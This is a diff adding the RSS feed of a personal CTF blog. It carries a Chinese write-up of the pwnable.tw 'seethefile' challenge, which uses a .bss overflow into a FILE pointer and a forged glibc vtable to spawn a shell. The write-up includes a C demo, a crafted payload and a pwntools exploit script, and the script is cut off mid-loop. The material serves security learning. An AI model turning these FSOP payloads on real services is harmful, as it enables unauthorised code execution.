@@ -1,0 +1,328 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>karz4n</title>
+    <description>My ctf blog.</description>
+    <link>http://localhost:8000</link>
+    <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>karz4n</name>
+      <email>haiweiwang1109@163.com</email>
+      <uri>https://karzanWang.github.io</uri>
+    </author>
+    
+      <item>
+        <title>Pwnable.Tw Seethefile</title>
+        <description>&lt;h2 id=&quot;分析程序&quot;&gt;分析程序&lt;/h2&gt;
+
+&lt;p&gt;拿到样本，常规分析可以知道是32位ELF，保护只打开了NX和Partial RELRO。运行一下就是经典的菜单题。glibc版本为Ubuntu GLIBC 2.23-0ubuntu5&lt;/p&gt;
+
+&lt;p&gt;放到IDA里查看， 可以发现所有的symbol都保留了。几乎没有漏洞。在程序退出的时候输入的name是一个漏洞点。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;case 5:
+        printf(&quot;Leave your name :&quot;);
+        __isoc99_scanf(&quot;%s&quot;, &amp;amp;name);
+        printf(&quot;Thank you %s ,see you next time\n&quot;, &amp;amp;name);
+        if ( fp )
+          fclose(fp);
+        exit(0);
+        return;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;有趣的是name在bss端上的位置恰好在fp（题目打开文件使用的fp）上面，所以应该需要我们围绕这个点来攻击。&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.bss:0804B260 name            db    ? ;               ; DATA XREF: main+9F↑o
+.bss:0804B260                                         ; main+B4↑o
+.bss:0804B261                 db    ? ;
+.................
+.bss:0804B280                 public fp
+.bss:0804B280 ; FILE *fp
+.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
+.bss:0804B280                                         ; openfile+AD↑w ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;利用思路&quot;&gt;利用思路&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html&quot;&gt;ctf all in one&lt;/a&gt;上关于file的利用写的比较详细，也非常建议参考&lt;a href=&quot;https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/&quot;&gt;ctf wiki&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;IO_FILE结构体，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc/libio/bits/types/struct_FILE.h&lt;/code&gt;中&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;struct _IO_FILE
+{
+  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  char *_IO_read_ptr;        /* Current read pointer */
+  char *_IO_read_end;        /* End of get area. */
+  char *_IO_read_base;        /* Start of putback+get area. */
+  char *_IO_write_base;        /* Start of put area. */
+  char *_IO_write_ptr;        /* Current put pointer. */
+  char *_IO_write_end;        /* End of put area. */
+  char *_IO_buf_base;        /* Start of reserve area. */
+  char *_IO_buf_end;        /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;
+  int _fileno;
+  int _flags2;
+  __off_t _old_offset; /* This used to be _offset but it's too small.  */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc/libio/libioP.h&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;struct _IO_FILE_plus
+{
+  _IO_FILE file;
+  const struct _IO_jump_t *vtable;
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;fp指针指向的是一个被fopen()返回的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt;结构体，但是这个结构体就是转换自_IO_FILE_plus的。&lt;/p&gt;
+
+&lt;p&gt;其中的vtable涉及到了结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_IO_jump_t&lt;/code&gt;, vtable的作用就是一张跳表，包含和文件交互的虚函数。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;举个例子，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fclose(FILE *ptr)&lt;/code&gt;调用的时候，存储在结构体中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__finish&lt;/code&gt;的函数指针在释放内部结构后就会被调用。&lt;/p&gt;
+
+&lt;h3 id=&quot;攻击手段file-stream-oriented-programming&quot;&gt;攻击手段File-Stream Oriented Programming&lt;/h3&gt;
+
+&lt;p&gt;针对IO_FILE的攻击一般称之为File-Stream Oriented Programming，简单来说就是伪造vtable中的函数指针，指向危险函数，当程序调用对应的函数的时候（也就是操作文件），就会去执行指定出来的危险函数。&lt;/p&gt;
+
+&lt;p&gt;example:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// gcc -m32 test.c -o test
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+void* vtable[] = {
+    NULL, //    JUMP_FIELD(size_t, __dummy);
+    NULL, //    JUMP_FIELD(size_t, __dummy2);
+    NULL, //    JUMP_FIELD(_IO_finish_t, __finish);
+    NULL, //    JUMP_FIELD(_IO_overflow_t, __overflow);
+    NULL, //    JUMP_FIELD(_IO_underflow_t, __underflow);
+    NULL, //    JUMP_FIELD(_IO_underflow_t, __uflow);
+    NULL, //    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    NULL, //    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    NULL, //    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    NULL, //    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    NULL, //    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    NULL, //    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    NULL, //    JUMP_FIELD(_IO_sync_t, __sync);
+    NULL, //    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    NULL, //    JUMP_FIELD(_IO_read_t, __read);
+    NULL, //    JUMP_FIELD(_IO_write_t, __write);
+    NULL, //    JUMP_FIELD(_IO_seek_t, __seek);
+    system,  // JUMP_FIELD(_IO_close_t, __close);
+    NULL, //    JUMP_FIELD(_IO_stat_t, __stat);
+    NULL, //    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    NULL  //    JUMP_FIELD(_IO_imbue_t, __imbue);
+};
+
+int main(int argc, char** argv) {
+    // Creates a file and overwrites the vtable field in the FILE struct
+    FILE *fp = fopen(&quot;/dev/null&quot;, &quot;r&quot;);
+    size_t *vtable_addr = ((void *) fp) + sizeof(FILE);
+
+    *vtable_addr = (size_t *)vtable;
+
+    // Moves &quot;/bin/sh\x00&quot; to the start of the file pointer.
+    // When system is called, it will interpret the FILE* as a char*, which
+    // means that the interpreted string will be &quot;/bin/sh&quot; due to the null byte.
+    strcpy(fp, &quot;/bin/sh\x00&quot;);
+
+    // Calls system with the FILE pointer as an argument. This should create
+    // a shell.
+    fclose(fp);
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这个例子中就是把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__finish&lt;/code&gt;函数指针指向system，当file关闭的时候由于fp被改成了/bin/sh，所以实际上执行的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh\x00&quot;)&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;再回到题目本身，首先我们可以通过读取进程文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/maps&lt;/code&gt;来获取内存中libc的基地址，然后伪造vtable去执行system，但是当我们这么做的时候会直接segment fault，主要原因是fclose函数中对于fp会做一定的检查，可以去看一下源码。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;int
+attribute_compat_text_section
+_IO_old_fclose (_IO_FILE *fp)
+{
+  int status;
+
+  CHECK_FILE(fp, EOF);
+
+  /* We desperately try to help programs which are using streams in a
+     strange way and mix old and new functions.  Detect new streams
+     here.  */
+  if (fp-&amp;gt;_vtable_offset == 0)
+    return _IO_new_fclose (fp);
+
+  /* First unlink the stream.  */
+  if (fp-&amp;gt;_IO_file_flags &amp;amp; _IO_IS_FILEBUF)
+    _IO_un_link ((struct _IO_FILE_plus *) fp);
+
+  _IO_acquire_lock (fp);
+  if (fp-&amp;gt;_IO_file_flags &amp;amp; _IO_IS_FILEBUF)
+    status = _IO_old_file_close_it (fp);
+  else
+    status = fp-&amp;gt;_flags &amp;amp; _IO_ERR_SEEN ? -1 : 0;
+  _IO_release_lock (fp);
+  _IO_FINISH (fp);
+  if (_IO_have_backup (fp))
+    _IO_free_backup_area (fp);
+  if (fp != _IO_stdin &amp;amp;&amp;amp; fp != _IO_stdout &amp;amp;&amp;amp; fp != _IO_stderr)
+    {
+      fp-&amp;gt;_IO_file_flags = 0;
+      free(fp);
+    }
+
+  return status;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;主要有两个关键的检查_IO_release_lock和_IO_IS_FILEBUF。对于lock的检查涉及到_IO_lock_t ，比较简单&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;typedef struct { 
+     int lock; 
+     int cnt; 
+     void *owner;
+} _IO_lock_t;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只要把cnt设置为0，close的时候回acquire然后release，最后的cnt为0即可。&lt;/p&gt;
+
+&lt;p&gt;对于_IO_IS_FILEBUF，只要设置为not，就可以跳过很多的检查，去查源码可以发现glibc/libio/libio.h中有_IO_IS_FILEBUF的掩码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#define _IO_IS_FILEBUF        0x2000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;则可以轻易知道反码为0xffffdfff。满足这些条件就可以通过检查了。&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;# file
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFDFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;/bin/sh;&quot;&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;???     to be interpreted as a string
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;# padding to reach *fp 32bytes
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'`'&lt;/span&gt;                                  &lt;span class=&quot;c1&quot;&gt;# padding
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;# padding 72bytes
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'filename'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy 00000没用过的内存
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2 vtable的偏移，同时是vtable的dummy2
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;#               vtable-&amp;gt;__finish
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;最终脚本&quot;&gt;最终脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'./seethefile'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./seethefile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./libc_32.so.6'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'chall.pwnable.tw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;openfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'choice :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;see :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'choice :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;writefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'choice :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'---------------MENU---------------'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'---------------MENU---------------'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;closefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'choice :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'choice :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;openfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/proc/self/maps'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;writefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
